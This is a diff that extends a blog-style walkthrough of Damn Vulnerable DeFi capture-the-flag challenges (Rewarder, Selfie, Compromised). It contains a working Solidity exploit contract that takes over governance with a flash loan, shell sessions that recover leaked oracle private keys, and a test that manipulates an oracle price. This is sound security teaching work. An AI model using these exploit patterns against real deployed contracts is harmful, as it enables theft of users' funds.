@@ -279,11 +279,12 @@ The `SideEntranceLenderPool` is another flash loan pool with bad accounting. Tak
 `flashLoan` determines whether you paid it back by comparing its _total_ account balance before and after. Meanwhile, it determines _your account's_ balance via an internal acccounting variable, `balances`. The exploit exists in the slack between the two. `deposit` is a `payable` function and uses `msg.value` directly. This means you have to pay in the basechain token, ETH. When you pay `deposit`, it adds it to the pool's balance while simultaneously adding to the accounting.
 
 Here's the idea:
-    1. Take a flash loan for everything in the pool
-    2. In your `execute` function, deposit it all into your account
-    3. When `flashLoan` is returned to from your function, the balances will match
-    4. Withdraw everything from the pool
+1. Take a flash loan for everything in the pool
+2. In your `execute` function, deposit it all into your account
+3. When `flashLoan` is returned to from your function, the balances will match
+4. Withdraw everything from the pool
 
+<br>
 
 ```solidity
 contract Exploit {
@@ -321,6 +322,98 @@ Alice has claimed her rewards already. You can claim yours too! But you’ve rea
 Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.
 ```
 
+This challenge is going to be another exercise in managing complexity. Merkle trees, bit operations, deserialization from JSON, and a few red herrings. Let's start with our fundamentals. The goal is to ultimately transfer tokens out, so we need a function that transfers to us and a way to create some sort of accounting error.
+
+```solidity
+    function createDistribution(IERC20 token, bytes32 newRoot, uint256 amount) external {
+        if (amount == 0) revert NotEnoughTokensToDistribute();
+        if (newRoot == bytes32(0)) revert InvalidRoot();
+        if (distributions[token].remaining != 0) revert StillDistributing();
+
+        distributions[token].remaining = amount;
+
+        uint256 batchNumber = distributions[token].nextBatchNumber;
+        distributions[token].roots[batchNumber] = newRoot;
+        distributions[token].nextBatchNumber++;
+
+        SafeTransferLib.safeTransferFrom(address(token), msg.sender, address(this), amount);
+
+        emit NewDistribution(token, batchNumber, newRoot, amount);
+    }
+```
+
+Here's the first function with a transfer, `createDistribution`. It's `external` so we can call it. However, it transfers _from_ us, not _to_ us. And unless we can get someone else to call it, it's not useful for accounting either.
+
+```solidity
+    function clean(IERC20[] calldata tokens) external {
+        for (uint256 i = 0; i < tokens.length; i++) {
+            IERC20 token = tokens[i];
+            if (distributions[token].remaining == 0) {
+                token.transfer(owner, token.balanceOf(address(this)));
+            }
+        }
+    }
+```
+
+`clean` is also `external`, but transfers funds to `owner`. `owner` is immutable and set to the creator of the contract. Not useful.
+
+```solidity
+function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
+    ...
+    inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
+}
+```
+
+The `claimRewards` `external` function is big and difficult to initially understand. However, we can see that the last line transfers tokens from the contract to `msg.sender`. Bingo. Now let's do some taint analysis. We need to figure which variables we control, how they affect the internal state, and what constraints exist on them. `claimRewards` takes in a list of `Claim`s and a list of `IERC20` tokens.
+
+A `Claim` is defined as follows:
+
+```solidity
+    struct Claim {
+        uint256 batchNumber;
+        uint256 amount;
+        uint256 tokenIndex;
+        bytes32[] proof;
+    }
+```
+
+Further down the function, we can see some input validation on each `Claim`'s fields.
+
+```solidity
+    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
+    bytes32 root = distributions[token].roots[inputClaim.batchNumber];
+
+    if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
+```
+
+So `proof` is some opaque Merkle tree path, the inputted `leaf` is built from our address, `msg.sender`, and the amount we're claiming. The `root` is defined when the distribution is created, so we don't control that. Manipulating `batchNumber` will only make things worse because either that `root` won't exist or will be incorrect. `tokenIndex` is the only remaining field, and it simply tells the function which index in the user-supplied `inputTokens` that claim corresponds to. The selected token is stored in `token`, which again, is required to be correct for the proof.
+
+Okay, but maybe we can create an accounting error using a correct `Claim`. How does it stop us from claiming a token twice?
+
+```solidity
+    if (token != inputTokens[inputClaim.tokenIndex]) {
+        if (address(token) != address(0)) {
+            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed(); // **DANI: This seems to stop double claiming?**
+        }
+
+        token = inputTokens[inputClaim.tokenIndex];
+        bitsSet = 1 << bitPosition; // set bit at given position
+        amount = inputClaim.amount;
+    } else {
+        bitsSet = bitsSet | 1 << bitPosition;
+        amount += inputClaim.amount;
+    }
+```
+
+This is where some funky bit manipulation comes in. Ignore it for now. The immediate line of interest throws `revert AlreadyClaimed()` if `_setClaimed` returns `false`. This is how they must be trying to stop double claiming. Let's assume for a moment that `_setClaimed` is entirely correct. `_setClaimed` is only checked if the current `Claim` is using a different token than the previous. It seems like this is intended functionality because there would be no reason to not check every iteration. Maybe one beneficiary could have multiple `Claim`s on the same `token` and `batchNumber`. However, this only stops us from calling the function again or interleaving `Claim`s from the same batch. **It does not check if a specific Claim has been used before**.
+
+This exploit is quite long due to all the setup with deserialization and building `Claim`s. Here's the rundown:
+1. Build our legitimate `Claim`s for each token, `weth` and `dvt`
+2. Determine how many of each token we need to `Claim` to drain the pool, `wethAmount` and `dvtAmount` respectively
+3. Create an array with `wethAmount` contiguous copies of the WETH `Claim` and `dvtAmount` contiguous copies of the DVT `Claim`
+4. Execute `claimRewards` with that array
+
+
 ## 6. Selfie
 ```
 A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.
@@ -330,6 +423,59 @@ What could go wrong, right ?
 You start with no DVT tokens in balance, and the pool has 1.5 million at risk.
 
 Rescue all funds from the pool and deposit them into the designated recovery account.
+```
+
+Alright, this one's just kinda funny. The governance mechanism, which I'm going to call the DAO, is controlled by a voting token, `DamnValuableVotes`. If the `msg.sender` has over half the supply of votes, it will execute an action on a `target` other than itself. On the `SelfiePool` that we're trying to rescue funds from, there's a spicy function called `emergencyExit`.
+
+```solidity
+    function emergencyExit(address receiver) external onlyGovernance {
+        uint256 amount = token.balanceOf(address(this));
+        token.transfer(receiver, amount);
+
+        emit EmergencyExit(receiver, amount);
+    }
+```
+
+This looks like a great mechanism for recovering the tokens, but it can only be called by the DAO. Now, I promised this would be funny: the lending pool's token is the same `DamnValuableVotes` that the DAO uses.
+
+Here's the exploit:
+1. `flashLoan` ourselves over half the vote
+2. Use `queueAction` on the DAO with the call to `emergencyExit` sending everything to the `recovery` account
+3. Give the tokens back to the pool
+4. Wait 3 days for the action to be runnable
+5. Run the action
+
+<br/>
+
+```solidity
+contract Exploit is IERC3156FlashBorrower {
+    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
+    SimpleGovernance immutable governance;
+    SelfiePool immutable pool;
+    address immutable recovery;
+    uint256 actionId;
+
+    constructor(SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
+        governance = _governance;
+        pool       = _pool;
+        recovery   = _recovery;
+    }
+
+    function setup(address token) public {
+        pool.flashLoan(IERC3156FlashBorrower(this), token, TOKENS_IN_POOL, "");
+    }
+
+    function win() public {
+        governance.executeAction(actionId);
+    }
+
+    function onFlashLoan(address, address token, uint256, uint256, bytes calldata) public returns (bytes32) {
+        DamnValuableVotes(token).delegate(address(this));
+        actionId = governance.queueAction(address(pool), 0, abi.encodeCall(SelfiePool.emergencyExit, (recovery)));
+        DamnValuableVotes(token).approve(address(pool), TOKENS_IN_POOL);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
 ```
 
 ## 7. Compromised
@@ -354,6 +500,116 @@ This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0x1
 
 Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.
 ```
+
+Woah, mysterious. Probably just the wind. Let's ignore it for now because we don't have the context to why those blobs are useful. There's a very obvious path that we should look at first. If we can manipulate the price of the NFTs, we can buy low and sell high. Hopefully, "low" is basically zero, and "high" is the entire pool. Alright, so how do these oracles work, and how is the price computed from that?
+
+Here's a little snip from the `TrustfulOracle` contract:
+
+```solidity
+    function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
+        _setPrice(msg.sender, symbol, newPrice);
+    }
+
+    function getMedianPrice(string calldata symbol) external view returns (uint256) {
+        return _computeMedianPrice(symbol);
+    }
+
+    function _setPrice(address source, string memory symbol, uint256 newPrice) private {
+        uint256 oldPrice = _pricesBySource[source][symbol];
+        _pricesBySource[source][symbol] = newPrice;
+        emit UpdatedPrice(source, symbol, oldPrice, newPrice);
+    }
+
+    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
+        uint256[] memory prices = getAllPricesForSymbol(symbol);
+        LibSort.insertionSort(prices);
+        if (prices.length % 2 == 0) {
+            uint256 leftPrice = prices[(prices.length / 2) - 1];
+            uint256 rightPrice = prices[prices.length / 2];
+            return (leftPrice + rightPrice) / 2;
+        } else {
+            return prices[prices.length / 2];
+        }
+    }
+```
+
+Each oracle is simple an externally owned account that is allowed to report a price to the `TrustfulOracle`. The `TrustfulOracle` computes the price it buys and sells for based off of the median of the three oracles. The median is actually a decent choice here. The median of a set is the just middle number when sorted. Imagine if they used averages and one oracle was malicious or compromised. The prices could look like `(1.5 eth, 1.3 eth, 9999999 eth)`. The average would be `3,333,335.8 eth`, but the median would only be `1.5 eth`. To abitrarily control the median, you would need to control over half the oracles.
+
+Wait.
+
+What were those two weird blobs up there? Let's look at the trusted oracle addresses again.
+
+```solidity
+    address[] sources = [
+        0x188Ea627E3531Db590e6f1D71ED83628d1933088
+        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
+        0xab3600bF153A316dE44827e2473056d56B774a40
+    ];
+```
+
+```bash
+┌──(samson)─[170]─[17:06:32]─[0:00:00.005972]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
+└─$ blob_a = Bytes(0x4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130)
+
+┌──(samson)─[171]─[16:22:19]─[0:00:00.001400]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
+└─$ blob_a
+<Bytes: b'MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0', byteorder='big'>
+
+┌──(samson)─[172]─[16:22:21]─[0:00:00.004340]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
+└─$ blob_a = EncodingScheme.BASE64.decode(a)
+
+┌──(samson)─[173]─[16:22:30]─[0:00:00.000655]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
+└─$ blob_a
+<Bytes: b'0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159', byteorder='big'>
+```
+
+Um okay, looks like it could be a 256-bit integer? Let's pop it into ECDSA and run Ethereum's address scheme on it.
+
+```bash
+┌──(samson)─[174]─[16:22:31]─[0:00:00.005360]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
+└─$ ec = ECDSA(secp256k1.G, d=0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159)
+
+┌──(samson)─[175]─[16:23:15]─[0:00:00.048775]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
+└─$ keccak256 = Keccak(r=1088, c=512, digest_bit_size=256)
+
+┌──(samson)─[176]─[16:23:28]─[0:00:00.000969]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
+└─$ keccak256.hash(ec.Q.serialize_uncompressed()[1:])[-20:].hex()
+<Bytes: b'a417d473c40a4d42bad35f147c21eea7973539d8', byteorder='big'>
+```
+
+Oh! It's an oracle's hex-encoded, BASE64-encoded, ASCII-encoded, hex-encoded private key! We have 2/3 of the oracles!
+
+Here's the exploit:
+1. Make both compromised oracles set the price to 0
+2. Buy an NFT
+3. Set both prices to the exchange's entire balance
+4. Sell the NFT
+
+<br/>
+
+```solidity
+    function test_compromised() public checkSolved {
+        Exploit exploit = new Exploit{value: PLAYER_INITIAL_ETH_BALANCE}(exchange, nft, recovery);
+
+        for (uint i=0; i < 2; i++) {
+            vm.startPrank(sources[i]);
+            oracle.postPrice("DVNFT", 0);
+            vm.stopPrank();
+        }
+
+        exploit.buy();
+
+
+        for (uint i=0; i < 2; i++) {
+            vm.startPrank(sources[i]);
+            oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+            vm.stopPrank();
+        }
+
+        exploit.sell();
+    }
+```
+
 
 ## 8. Puppet
 ```
